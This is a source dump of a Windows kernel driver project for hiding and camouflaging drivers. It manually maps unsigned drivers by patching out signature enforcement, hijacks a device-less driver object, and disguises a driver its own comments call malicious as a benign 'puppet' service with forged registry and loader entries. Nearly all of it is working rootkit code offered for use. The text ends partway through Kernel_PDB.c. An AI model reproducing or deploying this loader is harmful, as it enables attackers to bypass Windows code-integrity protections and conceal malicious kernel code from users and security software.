Project Path: arc_gmh5225_Drv_Hide_And_Camouflage_vr1i1n64

Source Tree:

```txt
arc_gmh5225_Drv_Hide_And_Camouflage_vr1i1n64
├── Project
│   ├── DriverObject.c
│   ├── DriverObject.h
│   ├── DrvLoad.c
│   ├── DrvLoad.h
│   ├── Drv_Hide_And_Camouflage.sln
│   ├── Head.h
│   ├── Kernel_PDB.c
│   ├── Kernel_PDB.h
│   ├── Kernel_PDB_Frame_R0.vcxproj
│   ├── Kernel_PDB_Frame_R0.vcxproj.filters
│   └── main.c
├── picture
│   ├── ARKHide.png
│   ├── Ark.png
│   └── HRJ.png
└── readme.md

```

`Project/DriverObject.c`:

```c
#include"Head.h"

extern PDRIVER_OBJECT Driver;

//找一个没有设备的驱动，劫持它的IO
PDRIVER_OBJECT FindNotDeviceDriver() {
	PUCHAR DriverObjectByte = (PUCHAR)Driver;
	POBJECT_HEADER_NAME_INFO PObjHeaderNameInfo = DriverObjectByte - _OBJECT_HEADER_Body_Offset - sizeof(OBJECT_HEADER_NAME_INFO);
	POBJECT_DIRECTORY PDirectory = PObjHeaderNameInfo->Directory;//该驱动所在目录
	PDRIVER_OBJECT TargetDrvObj = NULL;
	POBJECT_DIRECTORY_ENTRY PSubDirectoryEntry = NULL;
	POBJECT_DIRECTORY_ENTRY PDirectoryEntry = NULL;
	//DbgBreakPoint();
	for (int i = 0; i < 37; i++) {
		PDirectoryEntry = PDirectory->HashBuckets[i];
		if (PDirectoryEntry == NULL) {
			continue;
		}
		PSubDirectoryEntry = PDirectoryEntry;
		while (PSubDirectoryEntry != NULL) {
			TargetDrvObj = PSubDirectoryEntry->Object;
			if (TargetDrvObj->DeviceObject == NULL) {
				return TargetDrvObj;
			}
			PSubDirectoryEntry = PSubDirectoryEntry->ChainLink;
		}
	}
	return NULL;
}
```

`Project/DriverObject.h`:

```h
#pragma once
#include<ntddk.h>

#pragma once
#include<ntddk.h>

//_OBJECT_HEADER 内两个成员的偏移
enum _OBJECT_HEADER_Offset {
    _OBJECT_HEADER_Body_Offset = 0x30,
    _OBJECT_HEADER_TypeIndex_Offset = 0x18
};

//0x18 bytes (sizeof)
typedef struct _OBJECT_DIRECTORY_ENTRY
{
    struct _OBJECT_DIRECTORY_ENTRY* ChainLink;                                      //0x0
    VOID* Object;                                                           //0x8
    ULONG HashValue;                                                        //0x10
}OBJECT_DIRECTORY_ENTRY, * POBJECT_DIRECTORY_ENTRY;

//0x158 bytes (sizeof)
typedef struct _OBJECT_DIRECTORY
{
    POBJECT_DIRECTORY_ENTRY HashBuckets[37];                                //0x0
    ULONG64 Lock;                                                           //0x128
    ULONG64 DeviceMap;                                                      //0x130
    struct _OBJECT_DIRECTORY* ShadowDirectory;                                      //0x138
    VOID* NamespaceEntry;                                                   //0x140
    VOID* SessionObject;                                                    //0x148
    ULONG Flags;                                                            //0x150
    ULONG SessionId;                                                        //0x154
}OBJECT_DIRECTORY, * POBJECT_DIRECTORY;

//0x20 bytes (sizeof)
typedef struct _OBJECT_HEADER_NAME_INFO
{
    POBJECT_DIRECTORY Directory;                                            //0x0
    UNICODE_STRING Name;                                                    //0x8
    LONG ReferenceCount;                                                    //0x18
    ULONG Reserved;                                                         //0x1c
}OBJECT_HEADER_NAME_INFO, * POBJECT_HEADER_NAME_INFO;

PDRIVER_OBJECT FindNotDeviceDriver();
```

`Project/DrvLoad.c`:

```c
#include"Head.h"

KEVENT WaitWorkItem;
PDRIVER_OBJECT ShellDrv = NULL;
BOOLEAN IsWDF = FALSE;

//调用ShellDriverEntry跳板
NTSTATUS Shim(PShellContext PSContext) {
	NTSTATUS s = STATUS_SUCCESS;
	ShellDriverEntry(PSContext->DrvObj, PSContext->PSTR);
	KeSetEvent(&WaitWorkItem,0,FALSE);
	return s;

}

//通过驱动名字获取基址
PUCHAR GetDllBase(PUCHAR PDllName) {
	ANSI_STRING DllNameA;
	UNICODE_STRING DllNameU = { 0 };
	RtlInitAnsiString(&DllNameA, PDllName);
	RtlAnsiStringToUnicodeString(&DllNameU, &DllNameA, TRUE);
	PLIST_ENTRY64 PDriverSection = PsLoadedModuleList->Blink;

	PUCHAR PDriverSectionByte = NULL;
	PUCHAR ReturnBase = NULL;
	PUNICODE_STRING BaseDllName = NULL;
	while (PDriverSection != PsLoadedModuleList) {
		PDriverSectionByte = (PUCHAR)PDriverSection;
		BaseDllName = (PUNICODE_STRING)(PDriverSectionByte + BaseDllNameOffset);
		if (RtlEqualUnicodeString(BaseDllName, &DllNameU, TRUE)) {
			ReturnBase = *((PULONG64)(PDriverSectionByte + DllBaseOffset));
			break;
		}
		else {
			PDriverSection = PDriverSection->Blink;
		}
	}
	RtlFreeUnicodeString(&DllNameU);
	return ReturnBase;
}

//设置页面可写
VOID SetWrite(ULONG64 va) {
	PPT_ENTRY_4KB ppte = NULL;
	PTE_HIERARCHY context = { 0 };
	ULONG64 a = *(PULONG64)va;
	MiFillPteHierarchy(va, &context);
	ppte = context.pte;
	ppte->Fields.Write = 1;

}

ULONG64 WdfR0() {
	return 0;
}
//填充IAT
BOOLEAN MakeIAT(PUCHAR DllBase) {
	PMyIID Piid = NULL;
	PUCHAR ImportDllBase = NULL;
	ULONG32 ImportSize = 0;
	PUCHAR PDllName = NULL;
	//DbgBreakPoint();
	PUCHAR ImportVirtualAddress = RtlImageDirectoryEntryToData(DllBase, 1, 1, &ImportSize);
	int iidSize = sizeof(MyIID);

	PULONG64 PThisIATEOffset = 0;
	PULONG64 PThisITEOffset = 0;
	NTSTATUS status = STATUS_SUCCESS;
	Piid = (PMyIID)ImportVirtualAddress;
	for (int i = 0; i < ImportSize; i += iidSize) {
		if (Piid->d == 0)
			break;//全部填充完成
		PDllName = (PUCHAR)(DllBase + Piid->d);
		if (0 == memcmp(PDllName, WDF, 10)) {//WDF 需要修复
			IsWDF = TRUE;
			PThisIATEOffset = DllBase + Piid->e;
			while (*PThisIATEOffset != 0) {
				SetWrite(PThisIATEOffset);
				*PThisIATEOffset = WdfR0;
				PThisIATEOffset++;
			}
			Piid++;
			continue;
		}
		ImportDllBase = GetDllBase(PDllName);//get ImportDllBase
		PThisIATEOffset = DllBase + Piid->e;
		PThisITEOffset = DllBase + Piid->a;
		while (*PThisIATEOffset != 0 && *PThisITEOffset != 0) {
			SetWrite(PThisIATEOffset);
			status = MiSnapThunk(ImportDllBase, DllBase, PThisITEOffset, PThisIATEOffset, 0);
			if (status != STATUS_SUCCESS) {
				DbgPrint("error!\n");
				return FALSE;
			}
			PThisITEOffset++;
			PThisIATEOffset++;
		}
		Piid++;
	}
	return TRUE;
}

//禁用签名强制性回调
ULONG64 MySeValidateImageHeader() {
	return 0;
}

struct _WDF_BIND_INFO {
	ULONG32 Szie;
	UCHAR RZ[4];
	ULONG64 Component;
	UCHAR Version[0xc];
	ULONG32 FuncCount;
	ULONG64 FuncTable;
	ULONG64 Module;
};
//加载隐藏驱动
VOID LoadDrv(PWCHAR DrvPath) {

	int un = 0;
	PUCHAR PDriverSection = NULL;
	PUCHAR Section = NULL;
	PUCHAR DllBase = NULL;
	UNICODE_STRING Path;
	UNICODE_STRING Out;
	UNICODE_STRING Out14[14];
	UNICODE_STRING String1;
	PKTHREAD thread = NULL;
	KIRQL OldIrql = 0;
	//初始化事件
	KeInitializeEvent(&WaitWorkItem, SynchronizationEvent, FALSE);

	//禁用驱动签名强制  如果需要加载的驱动有签名，就不需要这一部分了，因为容易蓝屏
	CIFun = *Pqword_14040EF40;
	DbgPrint("PSeValidateImageHeader here %p\n", Pqword_14040EF40);
	*Pqword_14040EF40 = MySeValidateImageHeader;
	//映射驱动
	RtlInitUnicodeString(&Path, DrvPath);
	NTSTATUS s0 = MiGenerateSystemImageNames(&Path, 0, 0, &Out, Out14, &String1);
	thread = MmAcquireLoadLock();
	NTSTATUS s1 = MiObtainSectionForDriver(&String1, &Path, 0, 0, &PDriverSection);
	MmReleaseLoadLock(thread);
	if (s1 != STATUS_SUCCESS) {
		DbgPrint("error code:%X\n", s1);
		return;
	}
	Section = *(PULONG64)(PDriverSection + SectionOffset);
	DllBase = MiGetSystemAddressForImage(Section, 0, &un);
	KeRaiseIrql(1, &OldIrql);
	NTSTATUS s2 = MiMapSystemImage(Section, DllBase);
	KeLowerIrql(OldIrql);
	//恢复驱动签名强制  如果需要加载的驱动有签名，就不需要这一部分了，因为容易蓝屏
	*Pqword_14040EF40 = CIFun;

	//获取DriverEntry
	PIMAGE_NT_HEADERS Head = RtlImageNtHeader(DllBase);
	PUCHAR Headd = (PUCHAR)Head;
	int* p = NULL;
	p = Headd + 0x28;//IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
	PULONG64 c = &ShellDriverEntry;
	*c = DllBase + *p;


	//修复IAT
	if (!MakeIAT(DllBase)) {
		return;
	}
	

	//修复_security_cookie
	int size = 0;
	PULONG64 ConfigAdd = 0;
	PULONG64 P_security_cookieAddress = NULL;
	ConfigAdd = RtlImageDirectoryEntryToData(DllBase, 1, 0xA, &size);
	P_security_cookieAddress = ConfigAdd[0xb];
	SetWrite(P_security_cookieAddress);
	*P_security_cookieAddress = 1;//随意更改，但是一定要改

	
	//修复WDF(仅WDF需要修复，WDM无视)
	struct _WDF_BIND_INFO* PWdfBindInfo = ((ULONG64)P_security_cookieAddress) + 0x10;
	PULONG64 PWdfFunctions = PWdfBindInfo->FuncTable;
	PULONG64 PWdfDriverGlobals = NULL;
	if (IsWDF == TRUE) {
		*PWdfFunctions = (ULONG64)ExAllocatePool(NonPagedPool, 0x1000);
		if ((*PWdfFunctions) == NULL) {
			return;
		}
		memset(*PWdfFunctions, 0, 0x1000);
		PWdfDriverGlobals = ((ULONG64)PWdfFunctions) + 8;
		*PWdfDriverGlobals = ExAllocatePool(NonPagedPool, 0x100);
		if (*PWdfDriverGlobals == NULL) {
			ExFreePool(*PWdfFunctions);
			return;
		}memset(*PWdfDriverGlobals, 0, 0x100);
	}

	//driverEntry
	DbgPrint("DllBase:%p\n", DllBase);
	ShellContext SContext = { 0 };
	SContext.DrvObj = FindNotDeviceDriver();
	ULONG64 OldDriverUnLoad = SContext.DrvObj->DriverUnload;//备份一下DriverUnLoad
	WORK_QUEUE_ITEM WorkItem = {0};
	WorkItem.WorkerRoutine = Shim;
	WorkItem.Parameter = &SContext;
	WorkItem.List.Flink = 0i64;
	ExQueueWorkItem(&WorkItem, DelayedWorkQueue);
	//等一下
	KeWaitForSingleObject(&WaitWorkItem, Executive, KernelMode, FALSE, NULL);

	//还原DriverUnLoad
	SContext.DrvObj->DriverUnload = OldDriverUnLoad;

	//提交劫持设备
	IopReadyDeviceObjects(SContext.DrvObj);

	//释放
	if (IsWDF == TRUE) {
		ExFreePool(*PWdfFunctions);
		ExFreePool(*PWdfDriverGlobals);
		*PWdfFunctions = 0;
		*PWdfDriverGlobals = 0;
	}
	
}

//-------------------------------------------驱动伪装
//创建注册表项 返回对应注册表句柄
HANDLE CreateRegistry(PWCHAR ODrvPath, PWCHAR ServiceName) {
	NTSTATUS status = STATUS_SUCCESS;
	OBJECT_ATTRIBUTES objAttrs = { 0 };
	UNICODE_STRING SerRegistryPath = { 0 }, SerName = { 0 }, RegUnicodeString = { 0 };
	HANDLE hReg = NULL;
	ULONG64 Out = 0;
	UNICODE_STRING ImagePathUn = { 0 }, DisplayNameUn = { 0 }, ErrorControlUn = { 0 }, StartUn = { 0 }, TypeUn = { 0 };
	RtlInitUnicodeString(&DisplayNameUn, L"DisplayName");
	RtlInitUnicodeString(&ImagePathUn, L"ImagePath");
	RtlInitUnicodeString(&ErrorControlUn, L"ErrorControl");
	RtlInitUnicodeString(&StartUn, L"Start");
	RtlInitUnicodeString(&TypeUn, L"Type");
	ULONG64 EC = 1, Str = 3, Typ = 1;
	RtlInitUnicodeString(&SerRegistryPath, ServiceRegistryPath);
	RtlInitUnicodeString(&SerName, ServiceName);
	RegUnicodeString.Buffer = ExAllocatePool(NonPagedPool, (ULONG64)SerRegistryPath.MaximumLength + (ULONG64)SerName.MaximumLength);
	if (RegUnicodeString.Buffer == NULL) {
		return 0;
	}
	//DbgBreakPoint();
	memset(RegUnicodeString.Buffer, 0, (ULONG64)SerRegistryPath.MaximumLength + (ULONG64)SerName.MaximumLength);
	memcpy(RegUnicodeString.Buffer, SerRegistryPath.Buffer, SerRegistryPath.Length);
	memcpy(&RegUnicodeString.Buffer[SerRegistryPath.Length / 2], SerName.Buffer, SerName.Length);
	RegUnicodeString.MaximumLength = SerRegistryPath.MaximumLength + SerName.MaximumLength;
	RegUnicodeString.Length = SerRegistryPath.Length + SerName.Length;
	InitializeObjectAttributes(&objAttrs, &RegUnicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);
	status = ZwCreateKey(&hReg, KEY_ALL_ACCESS, &objAttrs, 0, NULL, REG_OPTION_VOLATILE, &Out);
	status = ZwSetValueKey(hReg, &ImagePathUn, NULL, REG_EXPAND_SZ, ODrvPath, 2 * wcslen(ODrvPath));
	status = ZwSetValueKey(hReg, &DisplayNameUn, NULL, REG_SZ, ServiceName, 2 * wcslen(ServiceName));
	status = ZwSetValueKey(hReg, &ErrorControlUn, NULL, REG_DWORD, &EC, 4);
	status = ZwSetValueKey(hReg, &StartUn, NULL, REG_DWORD, &Str, 4);
	status = ZwSetValueKey(hReg, &TypeUn, NULL, REG_DWORD, &Typ, 4);
	return hReg;
}

//ADrvPath 恶意驱动路径：  例如：L"\\??\\C:\\Users\\52pojie\\Desktop\\A.sys"
//ODrvPath 傀儡驱动路径：  例如：L"\\??\\C:\\Users\\52pojie\\Desktop\\T.sys"
//ServiceName 傀儡服务名： 例如：L"xixi"
BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) {
	NTSTATUS status = STATUS_SUCCESS;
	PDRIVER_OBJECT PTDrvObj = NULL;
	ULONG64 Out = 0;
	WCHAR ServiceNameBuffer[0x50] = { 0 };
	HANDLE HRegistry = NULL;

	//映射、修复IAT
	int un = 0;
	PUCHAR PADriverSection = NULL;
	PLDR_DATA_TABLE_ENTRY PODriverSection = NULL;
	PLDR_DATA_TABLE_ENTRY NewPODriverSection = NULL;
	//这三个都是ADrv的信息
	PUCHAR Section = NULL;
	PUCHAR DllBase = NULL;
	ULONG32 DllSize = 0;

	UNICODE_STRING ADrvPathUn;
	UNICODE_STRING ODrvPathUn;
	//这两个都是ODrv的信息
	UNICODE_STRING OutU;
	UNICODE_STRING Out14[14];

	UNICODE_STRING AString;
	UNICODE_STRING OString;
	PKTHREAD thread = NULL;

	PUCHAR Head = NULL;

	PULONG64 ConfigAdd = 0;
	PULONG64 P_security_cookieAddress = NULL;

	struct _WDF_BIND_INFO* PWdfBindInfo = NULL;
	PULONG64 PWdfFunctions = NULL;
	PULONG64 PWdfDriverGlobals = NULL;

	HANDLE DrvH = NULL;
	OBJECT_ATTRIBUTES att = { 0 };
	UNICODE_STRING ObjectName = { 0 };

	PUNICODE_STRING PSTR = NULL;
	ULONG NtQueryObjReturnLen = 0;
	ShellContext DEContext = { 0 };
	WORK_QUEUE_ITEM WorkItem = { 0 };

	KIRQL OldIrql = 0;
	//创建服务注册表
	HRegistry = CreateRegistry(ODrvPath, ServiceName);
	DbgBreakPoint();
	try {
		//上锁
		ExAcquireResourceExclusiveLite(PIopDriverLoadResource, 1);
		//禁用驱动签名强制 如果需要加载的驱动有签名，就不需要这一部分了，因为容易蓝屏
		CIFun = *Pqword_14040EF40;  
		DbgPrint("PSeValidateImageHeader here %p\n", Pqword_14040EF40);
		*Pqword_14040EF40 = MySeValidateImageHeader;

		//映射驱动
		RtlInitUnicodeString(&ADrvPathUn, ADrvPath);
		status = MiGenerateSystemImageNames(&ADrvPathUn, 0, 0, &OutU, Out14, &AString);
		//OUT : UN"已签名.sys" 
		//Out14[0] : UN"Path前缀" Out14[3] : UN"\Driver\"
		//String1 同 Path
		RtlInitUnicodeString(&ODrvPathUn, ODrvPath);
		status = MiGenerateSystemImageNames(&ODrvPathUn, 0, 0, &OutU, Out14, &OString);

		//DbgBreakPoint();
		//创建DriverSection
		thread = MmAcquireLoadLock();
		status = MiObtainSectionForDriver(&AString, &ADrvPathUn, 0, 0, &PADriverSection);
		status = MiObtainSectionForDriver(&OString, &ODrvPathUn, 0, 0, &PODriverSection);
		MmReleaseLoadLock(thread);

		//映射ADrv,不映射ODrv
		Section = *(PULONG64)(PADriverSection + SectionOffset);//改了这
		DllBase = MiGetSystemAddressForImage(Section, 0, &un);

		KeRaiseIrql(1, &OldIrql);
		NTSTATUS s2 = MiMapSystemImage(Section, DllBase);
		KeLowerIrql(OldIrql);

		//恢复驱动签名强制  如果需要加载的驱动有签名，就不需要这一部分了，因为容易蓝屏
		*Pqword_14040EF40 = CIFun;
		Head = RtlImageNtHeader(DllBase);
		DllSize = *(PULONG32)(Head + 0x50);

		//提交DriverSection
		PODriverSection->SizeOfImage = DllSize;
		PODriverSection->DllBase = DllBase;
		status = MiConstructLoaderEntry(PODriverSection, &OutU, &OString, 0, 1, &NewPODriverSection);
		ExFreePoolWithTag(PODriverSection, 0);
		ExFreePoolWithTag(PADriverSection, 0);
		NewPODriverSection->Flags = 0x49104000;
		//flag 0x49104000


		//修复IAT
		if (!MakeIAT(DllBase)) {
			return FALSE;
		}


		//修复_security_cookie
		int size = 0;
		ConfigAdd = RtlImageDirectoryEntryToData(DllBase, 1, 0xA, &size);
		P_security_cookieAddress = ConfigAdd[0xb];
		SetWrite(P_security_cookieAddress, 1);
		*P_security_cookieAddress = 1;
		//SetWrite(P_security_cookieAddress, 0);

		//修复WDF
		if (IsWDF == TRUE) {
			PWdfBindInfo = ((ULONG64)P_security_cookieAddress) + 0x10;
			PWdfFunctions = PWdfBindInfo->FuncTable;
			//SetWrite(P_security_cookieAddress, 1);
			*PWdfFunctions = (ULONG64)ExAllocatePool(NonPagedPool, 0x1000);
			//SetWrite(P_security_cookieAddress, 0);
			if ((*PWdfFunctions) == NULL) {
				return FALSE;
			}
			memset(*PWdfFunctions, 0, 0x1000);
			PWdfDriverGlobals = ((ULONG64)PWdfFunctions) + 8;
			//SetWrite(P_security_cookieAddress, 1);
			*PWdfDriverGlobals = ExAllocatePool(NonPagedPool, 0x100);
			//SetWrite(P_security_cookieAddress, 0);
			if (*PWdfDriverGlobals == NULL) {
				ExFreePool(*PWdfFunctions);
				return FALSE;
			}memset(*PWdfDriverGlobals, 0, 0x100);
		}

		DbgPrint("DllBase:%p\n", DllBase);


		//构造DriverObject并插入
		memcpy(ServiceNameBuffer, DrvObjNamePrefix, 2 * wcslen(DrvObjNamePrefix));
		memcpy(&ServiceNameBuffer[wcslen(DrvObjNamePrefix)], ServiceName, 2 * wcslen(ServiceName));
		RtlInitUnicodeString(&ObjectName, ServiceNameBuffer);
		att.Length = 0x30; att.Attributes = 0x250; att.ObjectName = &ObjectName;
		status = ObCreateObjectEx(0, *PIoDriverObjectType, &att, 0, &Out, 0x1A0, 0, 0, &PTDrvObj, 0);
		if (status != STATUS_SUCCESS) {
			return status;
		}
		memset(PTDrvObj, 0, 0x1a0);
		PTDrvObj->DriverExtension = &PTDrvObj[1];
		*(PULONG64)(&PTDrvObj[1]) = &PTDrvObj[0];
		for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
			PTDrvObj->MajorFunction[i] = PIopInvalidDeviceRequest;
		}
		PTDrvObj->Type = 4; PTDrvObj->Size = 0x150;
		PTDrvObj->DriverInit = NewPODriverSection->EntryPoint;
		PTDrvObj->DriverSection = NewPODriverSection;
		PTDrvObj->DriverStart = DllBase;
		PTDrvObj->DriverSize = DllSize;
		PTDrvObj->Flags |= 2;
		//DbgBreakPoint();
		status = ObInsertObjectEx(PTDrvObj, 0, 1, 0, 0, 0, &DrvH);
		ExReleaseResourceLite(PIopDriverLoadResource);//解锁
		status = ObReferenceObjectByHandle(DrvH, 0, *PIoDriverObjectType, 0, &PTDrvObj, NULL);
		ZwClose(DrvH);
		PTDrvObj->HardwareDatabase = PCmRegistryMachineHardwareDescriptionSystemName;
		PTDrvObj->DriverName.Buffer = ExAllocatePool(NonPagedPool, ObjectName.MaximumLength);
		PTDrvObj->DriverName.Length = ObjectName.Length;
		PTDrvObj->DriverName.MaximumLength = ObjectName.MaximumLength;
		if (PTDrvObj->DriverName.Buffer == NULL) {
			return FALSE;
		}
		memcpy(PTDrvObj->DriverName.Buffer, ObjectName.Buffer, ObjectName.MaximumLength);

		//DriverEntry
		PSTR = ExAllocatePool(NonPagedPool, 0x1000);
		status = ZwQueryObject(HRegistry, 1, PSTR, 0x1000, &NtQueryObjReturnLen);
		DEContext.DrvObj = PTDrvObj;
		DEContext.PSTR = PSTR;
		KeInitializeEvent(&WaitWorkItem, SynchronizationEvent, FALSE);
		PULONG64 SetDriverEntry = &ShellDriverEntry;
		*SetDriverEntry = PTDrvObj->DriverInit;
		WorkItem.WorkerRoutine = Shim;
		WorkItem.Parameter = &DEContext;
		WorkItem.List.Flink = 0i64;
		ExQueueWorkItem(&WorkItem, DelayedWorkQueue);

		KeWaitForSingleObject(&WaitWorkItem, Executive, KernelMode, FALSE, NULL);
		//提交设备
		IopReadyDeviceObjects(PTDrvObj);
		//释放
		ExFreePool(PSTR);
		ZwClose(HRegistry);
		if (IsWDF == TRUE) {
			ExFreePool(*PWdfFunctions);
			ExFreePool(*PWdfDriverGlobals);
			*PWdfFunctions = 0;
			*PWdfDriverGlobals = 0;
		}
		return TRUE;
	}except(1) {
		return FALSE;
	}
}

```

`Project/DrvLoad.h`:

```h
#pragma once
#include<ntifs.h>

#define DrvObjNamePrefix L"\\Driver\\"
#define ServiceRegistryPath L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\"
#define WDF "WDFLDR.SYS"

typedef struct _ShellContext {
	PDRIVER_OBJECT DrvObj;
	PUNICODE_STRING PSTR;
}ShellContext, * PShellContext;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG64 SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG32 Flags;
}LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

//WCHAR  DriverRegistryPrefix[0x100];

//关于无签名驱动加载
ULONG64 CIFun;
PULONG64 Pqword_14040EF40;
//获取Nt头
PIMAGE_NT_HEADERS(*RtlImageNtHeader)(PVOID DllBase);

//获取资源第一步
NTSTATUS(*MiGenerateSystemImageNames)(PUNICODE_STRING DriverPath, ULONG64 zero1, ULONG64 zero2, PUNICODE_STRING OutUnicode, PUNICODE_STRING OutUnicode14, PUNICODE_STRING String1);

//获取资源第二步 获取DriverSection _LDR_DATA_TABLE_ENTRY
NTSTATUS(*MiObtainSectionForDriver)(PUNICODE_STRING String1, PUNICODE_STRING DriverPath, ULONG64 zero1, ULONG64 zero2, PULONG64 PDriverSection);

//创建镜像虚拟地址
PUCHAR(*MiGetSystemAddressForImage)(PVOID PSECTION, int zero, int* un);

//映射镜像物理地址
NTSTATUS(*MiMapSystemImage)(PVOID PSECTION, PUCHAR BaseVa);

//get 数据目录地址
PUCHAR(*RtlImageDirectoryEntryToData)(PUCHAR DllBase, ULONG64 one, ULONG64 one1, PULONG32 PSize);

//填充IAT辅助函数
NTSTATUS(*MiSnapThunk)(PUCHAR importDllBase, PUCHAR DllBase, PULONG64 PITE, PULONG64 PIATE, ULONG64 zero);

//线程上锁
PKTHREAD(*MmAcquireLoadLock)();

//线程解锁
VOID(*MmReleaseLoadLock)(PKTHREAD thread);

//获取PPTE
ULONG64(*MiFillPteHierarchy)(ULONG64 va, PPTE_HIERARCHY Pout);

//需要调用这个函数，R3才能成功 CreateFile
VOID(*IopReadyDeviceObjects)(PDRIVER_OBJECT DrvObj);

//驱动入口
NTSTATUS(*ShellDriverEntry)(PVOID a, PVOID b);

//Other


ULONG64 SectionOffset;
PLIST_ENTRY64 PsLoadedModuleList;
ULONG64 BaseDllNameOffset;
ULONG64 DllBaseOffset;
ULONG64 SizeOfImageOffset;
ULONG64 FlagsOffset;


//----------------------

PULONG64 PIoDriverObjectType;

//资源锁参数
ULONG64 PIopDriverLoadResource;

//默认MajorFunction
ULONG64 PIopInvalidDeviceRequest;

//创建对象
NTSTATUS(*ObCreateObjectEx)(BOOLEAN AccMode, ULONG64 Type, POBJECT_ATTRIBUTES attributes, ULONG64 zero, PULONG64 Out, ULONG64 Size, ULONG64 zero1, ULONG64 zero2, PVOID PObject, ULONG64 zero3);

//加入对象表
NTSTATUS(*ObInsertObjectEx)(PVOID PObject, ULONG64 zero, ULONG64 one, ULONG64 zero1, ULONG64 zero2, ULONG64 zero3, PHANDLE PHandle);

//重新构造DriverSection并插入链表
NTSTATUS(*MiConstructLoaderEntry)(PLDR_DATA_TABLE_ENTRY DriverSection,
	PUNICODE_STRING DrvName,//"XXX.sys"
	PUNICODE_STRING DrvPath,//
	ULONG64 zero,
	ULONG64 one,
	PVOID PnewDriverSection);

ULONG64 PCmRegistryMachineHardwareDescriptionSystemName;

VOID LoadDrv(PWCHAR DrvPath);
BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName);
```

`Project/Drv_Hide_And_Camouflage.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31911.196
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Kernel_PDB_Frame_R0", "Kernel_PDB_Frame_R0.vcxproj", "{620D6B54-5723-457E-92CB-980340074BC6}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|ARM = Debug|ARM
		Debug|ARM64 = Debug|ARM64
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|ARM = Release|ARM
		Release|ARM64 = Release|ARM64
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|ARM.ActiveCfg = Debug|ARM
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|ARM.Build.0 = Debug|ARM
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|ARM.Deploy.0 = Debug|ARM
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|ARM64.ActiveCfg = Debug|ARM64
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|ARM64.Build.0 = Debug|ARM64
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|ARM64.Deploy.0 = Debug|ARM64
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|x64.ActiveCfg = Debug|x64
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|x64.Build.0 = Debug|x64
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|x64.Deploy.0 = Debug|x64
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|x86.ActiveCfg = Debug|Win32
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|x86.Build.0 = Debug|Win32
		{620D6B54-5723-457E-92CB-980340074BC6}.Debug|x86.Deploy.0 = Debug|Win32
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|ARM.ActiveCfg = Release|ARM
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|ARM.Build.0 = Release|ARM
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|ARM.Deploy.0 = Release|ARM
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|ARM64.ActiveCfg = Release|ARM64
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|ARM64.Build.0 = Release|ARM64
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|ARM64.Deploy.0 = Release|ARM64
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|x64.ActiveCfg = Release|x64
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|x64.Build.0 = Release|x64
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|x64.Deploy.0 = Release|x64
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|x86.ActiveCfg = Release|Win32
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|x86.Build.0 = Release|Win32
		{620D6B54-5723-457E-92CB-980340074BC6}.Release|x86.Deploy.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {59EE58F8-A7FD-446F-AB4B-AAA1F4433389}
	EndGlobalSection
EndGlobal

```

`Project/Head.h`:

```h
#pragma once
#include "Kernel_PDB.h"
#include"DriverObject.h"
#include"DrvLoad.h"
```

`Project/Kernel_PDB.c`:

```c
#include"Head.h"


extern PDRIVER_OBJECT Driver;

//导出的函数或全局变量才能用这个
ULONG64 GetSymAddress(PWCHAR Name) {
	UNICODE_STRING UName = { 0 };
	RtlInitUnicodeString(&UName, Name);
	return MmGetSystemRoutineAddress(&UName);
}

//初始化需要用到的偏移  自己想办法拿咯
BOOLEAN InitAllOffSet() {
	PsLoadedModuleList = GetSymAddress(L"PsLoadedModuleList");
	BaseDllNameOffset = 0x58;//GetMembersOffset(L"_LDR_DATA_TABLE_ENTRY", L"BaseDllName");
	SectionOffset = 0x70;//GetMembersOffset(L"_LDR_DATA_TABLE_ENTRY",L"HashLinks");
	DllBaseOffset = 0x30;//GetMembersOffset(L"_LDR_DATA_TABLE_ENTRY", L"DllBase");
